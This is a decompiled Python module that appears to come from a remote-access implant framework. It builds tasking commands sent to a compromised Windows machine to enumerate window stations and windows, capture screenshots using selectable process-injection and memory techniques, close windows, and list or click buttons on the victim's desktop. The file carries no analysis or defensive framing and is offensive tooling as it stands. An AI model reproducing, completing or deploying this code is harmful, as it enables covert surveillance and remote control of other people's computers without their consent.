# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Windows_Tasking.py
WINDOWS_TYPE_LIST = 1
WINDOWS_TYPE_SCREENSHOT = 2
WINDOWS_TYPE_CLOSE_WINDOW = 3
WINDOWS_TYPE_CLICK_BUTTON = 4
WINDOWS_TYPE_LIST_BUTTONS = 5
WINDOWS_RES_LOW = 0
WINDOWS_RES_MEDIUM = 1
WINDOWS_RES_HIGH = 2
WINDOWS_FMT_BMP = 0
WINDOWS_FMT_GIF = 1
WINDOWS_FMT_JPG = 2
WINDOWS_FMT_PNG = 3

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.windows', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.windows.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['windowStation'] != None:
        winSta = lpParams['windowStation']
    else:
        winSta = ''
    if lpParams['desktop'] != None:
        desktop = lpParams['desktop']
    else:
        desktop = ''
    msg = MarshalMessage()
    if lpParams['type'] == WINDOWS_TYPE_LIST:
        if len(winSta) > 0 and len(desktop) > 0:
            tgtParams = mca.status.cmd.windows.ParamsListWindows()
            tgtParams.winSta = winSta
            tgtParams.desktop = desktop
            rpc = mca.status.cmd.windows.tasking.RPC_INFO_LIST_WINDOWS
            tgtParams.Marshal(msg)
            rpc.SetData(msg.Serialize())
        else:
            rpc = mca.status.cmd.windows.tasking.RPC_INFO_LIST_STATIONS
    elif lpParams['type'] == WINDOWS_TYPE_SCREENSHOT:
        import mcl.tasking.technique
        screenshotParams = mca.status.cmd.windows.ParamsScreenshot()
        screenshotParams.winSta = winSta
        screenshotParams.desktop = desktop
        if len(screenshotParams.winSta) == 0:
            screenshotParams.winSta = 'WinSta0'
        if len(screenshotParams.desktop) == 0:
            screenshotParams.desktop = 'Default'
        screenshotParams.hWnd = lpParams['hWnd']
        if lpParams['resolution'] == WINDOWS_RES_LOW:
            screenshotParams.resolution = mca.status.cmd.windows.PARAMS_SCREENSHOT_RESOLUTION_LOW
        elif lpParams['resolution'] == WINDOWS_RES_MEDIUM:
            screenshotParams.resolution = mca.status.cmd.windows.PARAMS_SCREENSHOT_RESOLUTION_MEDIUM
        elif lpParams['resolution'] == WINDOWS_RES_HIGH:
            screenshotParams.resolution = mca.status.cmd.windows.PARAMS_SCREENSHOT_RESOLUTION_HIGH
        else:
            mcl.tasking.EchoError('Invalid resolution (%u)' % lpParams['resolution'])
            return False
        if lpParams['format'] == WINDOWS_FMT_BMP:
            screenshotParams.format = mca.status.cmd.windows.PARAMS_SCREENSHOT_FORMAT_BMP
        elif lpParams['format'] == WINDOWS_FMT_GIF:
            screenshotParams.format = mca.status.cmd.windows.PARAMS_SCREENSHOT_FORMAT_GIF
        elif lpParams['format'] == WINDOWS_FMT_JPG:
            screenshotParams.format = mca.status.cmd.windows.PARAMS_SCREENSHOT_FORMAT_JPG
        elif lpParams['format'] == WINDOWS_FMT_PNG:
            screenshotParams.format = mca.status.cmd.windows.PARAMS_SCREENSHOT_FORMAT_PNG
        else:
            mcl.tasking.EchoError('Invalid format (%u)' % lpParams['format'])
            return False
        screenshotParams.pid = lpParams['id']
        screenshotParams.force = lpParams['force']
        screenshotParams.injectProvider = mcl.tasking.technique.Lookup('WINDOWS', mcl.tasking.technique.TECHNIQUE_MCL_INJECT, lpParams['injectMethod'])
        screenshotParams.memoryProvider = mcl.tasking.technique.Lookup('WINDOWS', mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, lpParams['memoryMethod'])
        rpc = mca.status.cmd.windows.tasking.RPC_INFO_SCREENSHOT
        screenshotParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    elif lpParams['type'] == WINDOWS_TYPE_CLOSE_WINDOW or lpParams['type'] == WINDOWS_TYPE_CLICK_BUTTON or lpParams['type'] == WINDOWS_TYPE_LIST_BUTTONS:
        if len(winSta) == 0 or len(desktop) == 0:
            mcl.tasking.EchoError('A windowstation and desktop must be specified')
            return False
        if lpParams['hWnd'] == 0:
            mcl.tasking.EchoError('A window handle value must be specified')
            return False
        if lpParams['type'] == WINDOWS_TYPE_CLOSE_WINDOW:
            tgtParams = mca.status.cmd.windows.ParamsCloseWindow()
            tgtParams.winSta = winSta
            tgtParams.desktop = desktop
            tgtParams.hWnd = lpParams['hWnd']
            rpc = mca.status.cmd.windows.tasking.RPC_INFO_CLOSE_WINDOW
            tgtParams.Marshal(msg)
            rpc.SetData(msg.Serialize())
        elif lpParams['type'] == WINDOWS_TYPE_LIST_BUTTONS:
            tgtParams = mca.status.cmd.windows.ParamsListButtons()
            tgtParams.winSta = winSta
            tgtParams.desktop = desktop
            tgtParams.hWnd = lpParams['hWnd']
            rpc = mca.status.cmd.windows.tasking.RPC_INFO_LIST_BUTTONS
            tgtParams.Marshal(msg)
            rpc.SetData(msg.Serialize())
        else:
            if lpParams['buttonText'] == None:
                mcl.tasking.EchoError('A button text value must be specified')
                return False
            tgtParams = mca.status.cmd.windows.ParamsClickButton()
            tgtParams.winSta = winSta
            tgtParams.desktop = desktop
            tgtParams.hWnd = lpParams['hWnd']
            tgtParams.buttonText = lpParams['buttonText']
            rpc = mca.status.cmd.windows.tasking.RPC_INFO_CLICK_BUTTON
            tgtParams.Marshal(msg)
            rpc.SetData(msg.Serialize())
    else:
        mcl.tasking.OutputError('Invalid type (%u)' % lpParams['type'])
        return False
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.status.cmd.windows.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)